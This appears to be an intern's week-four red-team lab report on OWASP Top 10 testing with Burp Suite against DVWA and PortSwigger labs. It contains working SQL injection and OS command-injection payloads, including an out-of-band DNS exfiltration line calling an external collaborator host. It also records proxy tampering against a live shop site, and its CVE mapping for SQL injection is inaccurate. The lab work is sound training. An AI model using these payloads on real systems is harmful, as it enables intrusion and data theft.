# 🔴 CYBERSTER RED TEAMING — Week 04

> **Offensive Security Internship | Muhammad Hozaifa Naeem | CSI-B1-049**  
> **Task Title:** Web Application Penetration Testing (OWASP Top 10)  
> **Report Date:** April 2026  
> **Classification:** Confidential – For Internal Use Only

---

## 📋 Table of Contents

- [Overview](#overview)
- [Lab Environment](#lab-environment)
- [Task 01 — Burp Suite Mastery](#task-01--burp-suite-mastery-the-interceptor)
- [Task 02 — SQL Injection](#task-02--sql-injection-attacks)
- [Task 03 — OS Command Injection](#task-03--os-command-injection)
- [Task 04 — Broken Access Control](#task-04--broken-access-control--idor)
- [CVE Mapping](#cve-mapping-table)
- [Findings Summary](#findings-summary--risk-assessment)
- [Lessons Learned](#lessons-learned)
- [Tools Used](#tools-used)

---

## Overview

Week 04 focused on **Web Application Penetration Testing** targeting the OWASP Top 10 vulnerability categories. I progressed from basic proxy interception through Burp Suite to exploiting SQL Injection at two difficulty levels, then tackled four variants of OS Command Injection — including advanced blind and out-of-band techniques — and concluded with three Broken Access Control scenarios.

| Task | Description | Target | Result |
|------|-------------|--------|--------|
| Task 01 | Burp Suite Mastery – Proxy, Repeater & Intruder | rubinoshoes.com | Requests intercepted, modified & replayed |
| Task 02 | SQL Injection (Easy & Medium) | DVWA localhost:8081 | All user records dumped |
| Task 03 | OS Command Injection (4 variants) | PortSwigger Web Security Academy | RCE achieved; OOB exfil confirmed |
| Task 04 | Broken Access Control (3 labs) | PortSwigger Web Security Academy | Admin panel accessed; privilege escalated |

---

## Lab Environment

| Role | Platform | Notes |
|------|----------|-------|
| Attacker Tool | Burp Suite Professional v2025.11.6 | Primary web proxy & exploitation framework |
| Target 1 | DVWA (Damn Vulnerable Web App) | localhost:8081 — SQL Injection module |
| Target 2 | PortSwigger Web Security Academy | Command Injection & Access Control labs |
| OS | Kali Linux | Attack platform |
| OOB Channel | Burp Collaborator | DNS-based out-of-band interaction detection |

---

## Task 01 — Burp Suite Mastery (The Interceptor)

### Objective
Configure and master Burp Suite Professional as a web application proxy to understand the full Request-Response cycle.

### What I Did

**Phase 1 — Proxy Interception**  
Configured Burp's built-in browser with the proxy listener on port 8080. Captured live HTTP GET requests to `rubinoshoes.com` with full header and cookie visibility via the Inspector panel.

**Phase 2 — Repeater (Manual Request Replay)**  
Forwarded a POST multipart/form-data request to Burp Repeater. Modified form-data fields including `quantity`, `product-id`, and `section-id` — common injection points for business logic flaws and parameter tampering.

**Phase 3 — Response Analysis**  
Analyzed the server's HTTP/2 200 OK response after modification. Server revealed backend stack details: `Powered-By: Shopify`, Cloudflare CDN, `X-Frame-Options: DENY`.

**Phase 4 — Intruder (Automated Fuzzing)**  
Configured a Sniper attack with numeric payloads (1–10) targeting the `id` parameter. Used to enumerate valid product IDs — a first step in IDOR discovery.

### Key Commands / Config
```
Proxy → Intercept ON → Forward/Drop
Send to Repeater → Modify → Send
Send to Intruder → Sniper → Payload: Numbers 1-10 → Start Attack
```

### Screenshots
| Figure | Description |
|--------|-------------|
| Fig 1 | Proxy Intercept — GET request to rubinoshoes.com |
| Fig 2 | Repeater — POST body with 8 parameters selected |
| Fig 3 | Response panel — HTTP/2 200 OK with Set-Cookie headers |
| Fig 4 | Intruder — Sniper attack with numeric payload 1–10 |

---

## Task 02 — SQL Injection Attacks

### Objective
Exploit SQL Injection vulnerabilities in DVWA at Easy and Medium security levels to dump user database records.

### What I Did

**Lab Setup**  
Configured DVWA database at localhost:8081. Environment confirmed: `*nix OS`, `MySQL`, `PHP 7.0.30+deb9u1`.

**Easy Level — Basic String Injection**

Payload injected into User ID field:
```sql
1' OR '1'='1
```
Result: All 5 user records returned (`admin`, `Gordon Brown`, `Hack Me`, `Pablo Picasso`, `Bob Smith`).

**Medium Level — Numeric Injection via Burp**

The dropdown prevented string injection, so I intercepted the POST request in Burp and modified the `id` parameter directly:
```sql
1 OR 1=1--
```
Result: All user records dumped again, bypassing quote-escaping (`mysql_real_escape_string()`).

### Why It Works
The vulnerable backend query:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```
By injecting `OR 1=1`, the WHERE clause always evaluates to `TRUE`, returning all rows.

### Remediation
```php
// ❌ Vulnerable
$query = "SELECT * FROM users WHERE id = '$id'";

// ✅ Fixed — Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);
```

### Screenshots
| Figure | Description |
|--------|-------------|
| Fig 5 | DVWA Database Setup confirming MySQL backend |
| Fig 6 | Easy Level — all 5 users dumped via `1' OR '1'='1` |
| Fig 7 | Medium Level — numeric bypass via Burp Proxy |

---

## Task 03 — OS Command Injection

### Objective
Exploit OS Command Injection vulnerabilities across four progressive PortSwigger labs — from basic visible injection to blind time-based, output redirection, and out-of-band DNS exfiltration.

---

### Lab 1 — Basic OS Command Injection

**Endpoint:** `POST /product/stock`  
**Vulnerable parameter:** `storeId`

**Payload:**
```bash
storeId=2|ps+-ef
```

**Result:** Full process listing (`ps -ef`) returned in HTTP response — unauthenticated Remote Code Execution confirmed.

---

### Lab 2 — Blind OS Command Injection (Time-Based)

No output visible in response. Used time delay to confirm injection.

**Payload injected into `email` field:**
```bash
&email=sdf@gm||ping -c 10 127.0.0.1||
```

**Result:** ~10 second HTTP response delay confirmed blind command execution.

---

### Lab 3 — Blind OS Command Injection (Output Redirection)

Wrote command output to a web-accessible file then retrieved it.

**Step 1 — Write output:**
```bash
email=x@gmail.com||whoami>/var/www/images/whoami.txt||
```

**Step 2 — Retrieve file:**
```
GET /image?filename=whoami.txt
```

**Result:** Response body returned `peter-wlXR1X` — the web server process username.

---

### Lab 4 — Blind OS Command Injection (Out-of-Band DNS Exfiltration)

Used Burp Collaborator to receive DNS callbacks carrying exfiltrated data.

**Payload:**
```bash
email=x@gmail.com||nslookup+`whoami`.s2v8l4d5wwxqaihf6d2m6b0d74dw1sph.oastify.com||
```

**Result:** 4 DNS interactions received at Burp Collaborator. The subdomain of each DNS query contained the output of `whoami` — covert data exfiltration with **zero HTTP response needed**.

### Screenshots
| Figure | Description |
|--------|-------------|
| Fig 8 | Basic injection — `ps -ef` output in HTTP response |
| Fig 9 | Time-based blind — ping payload in Proxy Intercept |
| Fig 10 | Output redirect — POST with whoami redirect payload |
| Fig 11 | Output redirect — GET retrieves whoami.txt result |
| Fig 12 | OOB — nslookup payload in Repeater |
| Fig 13 | OOB — Burp Collaborator showing 4 DNS callbacks |

---

## Task 04 — Broken Access Control & IDOR

### Objective
Exploit Broken Access Control vulnerabilities across three PortSwigger labs — demonstrating that access control failures are the #1 risk in the OWASP Top 10 (2021).

---

### Lab 1 — Unprotected Admin via robots.txt

**Steps:**
1. Navigated to `/robots.txt`
2. Found: `Disallow: /administrator-panel`
3. Directly visited `/administrator-panel`
4. Accessed full admin panel — no authentication required
5. Deleted user `carlos` → Lab solved ✅

---

### Lab 2 — Admin URL Hidden in JavaScript Source

**Steps:**
1. Viewed page source (`Ctrl+U`)
2. Found JavaScript block:
```javascript
var isAdmin = false;
if (isAdmin) {
  var adminPanelTag = document.createElement('a');
  adminPanelTag.setAttribute('href', '/admin-98bu0h');
  adminPanelTag.innerText = 'Admin panel';
}
```
3. Navigated directly to `/admin-98bu0h`
4. Accessed admin panel — both `wiener` and `carlos` visible
5. Deleted `carlos` → Lab solved ✅

---

### Lab 3 — Privilege Escalation via Cookie Manipulation

**Steps:**
1. Logged in as standard user
2. Opened Browser DevTools → Application → Cookies
3. Found cookie: `Admin = false`
4. Modified value to: `Admin = true`
5. Refreshed page — server trusted client-side cookie
6. Admin panel granted — `User deleted successfully!` → Lab solved ✅

### Screenshots
| Figure | Description |
|--------|-------------|
| Fig 14 | robots.txt revealing `/administrator-panel` |
| Fig 15 | Admin panel accessed directly from robots.txt path |
| Fig 16 | JavaScript source with hardcoded `/admin-98bu0h` path |
| Fig 17 | Admin panel at the JS-disclosed URL |
| Fig 18 | DevTools cookies showing `Admin=true` after modification |

---

## CVE Mapping Table

| Vulnerability / OWASP | CVE / CWE | Severity | Description | Status |
|----------------------|-----------|----------|-------------|--------|
| SQL Injection (A03:2021) | CWE-89 / CVE-2012-1823 | 🔴 CRITICAL | Unsanitized input in SQL query; all records dumped | EXPLOITED – DVWA Easy & Medium |
| OS Command Injection (A03:2021) | CWE-78 | 🔴 CRITICAL | User input to OS shell without sanitization; RCE | EXPLOITED – 4 Lab Variants |
| Broken Access Control (A01:2021) | CWE-284 | 🟠 HIGH | Admin panel accessible without authentication | EXPLOITED – 3 Labs |
| LFI / Path Traversal (A05:2021) | CWE-22 | 🟠 HIGH | Directory traversal; `/etc/passwd` retrieved | EXPLOITED – PortSwigger Lab |
| Reflected XSS – Low (A03:2021) | CWE-79 | 🟠 HIGH | Script tag; cookie exfiltrated via `alert(document.cookie)` | EXPLOITED – DVWA Low |
| Reflected XSS – Medium (A03:2021) | CWE-79 | 🟠 HIGH | `img onerror` bypass; filter evaded | EXPLOITED – DVWA Medium |
| Reflected XSS – High (A03:2021) | CWE-79 | 🟠 HIGH | URL-encoded payload bypasses `preg_replace` filter | EXPLOITED – DVWA High |
| robots.txt Info Disclosure (A05:2021) | CWE-200 | 🟡 MEDIUM | Sensitive paths disclosed in robots.txt | EXPLOITED – Admin path revealed |
| Client-side Security Control (A05:2021) | CWE-602 | 🟠 HIGH | JS/cookie-based decisions trivially bypassed | EXPLOITED – Cookie & JS bypass |
| OOB DNS Exfiltration (A03:2021) | CWE-78 | 🔴 CRITICAL | DNS covert channel exfiltrates server data silently | EXPLOITED – Burp Collaborator |

---

## Findings Summary & Risk Assessment

| Finding | Severity | Type | Evidence | Recommendation |
|---------|----------|------|----------|----------------|
| SQL Injection (DVWA) | 🔴 CRITICAL | Database Compromise | All records via `OR 1=1` | Use Prepared Statements (PDO/MySQLi) |
| Basic OS Command Injection | 🔴 CRITICAL | Remote Code Execution | `ps -ef` in HTTP response | Sanitize input; avoid shell calls |
| Blind OS Injection (Time-based) | 🔴 CRITICAL | Covert RCE | 10-second delay confirmed | Whitelist values; remove shell access |
| Blind OS Injection (Output Redirect) | 🔴 CRITICAL | Data Exfiltration | `whoami` written to web file | Restrict write permissions |
| OOB DNS Exfiltration | 🔴 CRITICAL | Covert Data Exfil | 4 DNS callbacks with username | Egress filtering; block outbound DNS |
| LFI / Path Traversal | 🟠 HIGH | File Read | `/etc/passwd` retrieved | Validate filenames; use allowlists |
| XSS – Low (Script tag) | 🟠 HIGH | Session Hijacking | Cookie via `alert(document.cookie)` | Encode output; implement CSP |
| XSS – Medium (img onerror) | 🟠 HIGH | Filter Bypass | `str_replace` bypassed via event handler | DOMPurify; whitelist HTML tags |
| XSS – High (URL-encoded) | 🟠 HIGH | Regex Bypass | `preg_replace` evaded | WAF + strict CSP |
| robots.txt Admin Disclosure | 🟡 MEDIUM | Info Disclosure | `/administrator-panel` revealed | Remove sensitive paths |
| JS Source Admin URL | 🟠 HIGH | Info Disclosure | Path hardcoded in client-side JS | Never embed paths in JS |
| Cookie-based Privilege Escalation | 🟠 HIGH | Broken Access Control | `Admin=true` cookie trusted by server | Enforce server-side session roles |

---

## Lessons Learned

### 1. Input validation is the single most critical defense layer
Every injection attack this week — SQLi, OS command injection, LFI, XSS, and blind variants — succeeded because the application trusted user-supplied input and passed it directly to interpreters without validation. Prepared Statements, strict whitelisting, output encoding, and filename allowlists are non-negotiable.

### 2. Security by obscurity is not access control
Two of three Broken Access Control labs were solved purely by reading `robots.txt` and JavaScript source. Hiding sensitive URLs provides zero protection. Real access control must be enforced **server-side on every request**, regardless of how the URL was discovered.

### 3. XSS filter bypasses reveal layered defense gaps
The DVWA XSS progression (Low → Medium → High) showed that `str_replace` and even `preg_replace` regex filters can be bypassed via alternative event handlers and URL encoding. Proper XSS defense requires **contextual output encoding** and a strict **Content Security Policy**, not just input filtering.

### 4. Blind injection is more dangerous than visible injection
Time-based and OOB DNS exfiltration produce no visible error — making them harder to detect but equally devastating. An OOB channel requires **no HTTP response** and can bypass many logging systems. Organizations must monitor outbound DNS from application servers.

### 5. Burp Suite is an essential force-multiplier
Proxy → Repeater → Intruder → Collaborator covers the full web testing lifecycle: interception, manual exploitation, automated fuzzing, and out-of-band detection. It is a mandatory skill for any professional penetration tester.

---

## Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| Burp Suite Professional | v2025.11.6 | HTTP proxy, Repeater, Intruder, Collaborator |
| DVWA | localhost:8081 | SQLi & XSS target lab |
| PortSwigger Web Security Academy | Online | Command Injection & Access Control labs |
| Firefox + DevTools | — | Cookie inspection & modification |
| Kali Linux | — | Attack operating system |

---

## Report Structure

```
Week04/
├── README.md                          ← This file
├── Week04_Final_Report.pdf            ← Full professional PDF report
├── Week04_CVE_Findings_Lessons.docx   ← Combined tables (Word format)
└── screenshots/
    ├── InterscetpRequest.png
    ├── Repeater_.png
    ├── Response_Changed.png
    ├── intruder_Scanning.png
    ├── Got_acces_to_the_app_.png
    ├── Easy_Sql_injecton.png
    ├── Medium_Sql_injection.png
    ├── OS_Command_Injection.png
    ├── Blind_OS_time_based_.png
    ├── Blind_OS_command_injection_with_output_redirection.png
    ├── Output_Accessed_0f_Blind_OS_command_injection_with_output_redirection.png
    ├── Blind_OS_command_injection_with_out-of-band_data_exfiltration.png
    ├── Out_of_band_interaction.png
    ├── Robots_Revearling_DisallowEntries.png
    ├── Gain_Accessed_To_AdminstrativePanel.png
    ├── 2nd-Lab-Script-Unprotected_admin_functionality_with_unpredictable_URL.png
    ├── 2nd_lab_Exploited-Unprotected_admin_functionality_with_unpredictable_URL.png
    └── 3rd-Lab-User_controlled_by_request_parameter.png
```

---

*Confidential – Cyberster Red Team Internship | Muhammad Hozaifa Naeem | CSI-B1-049 | Week 04 | April 2026*
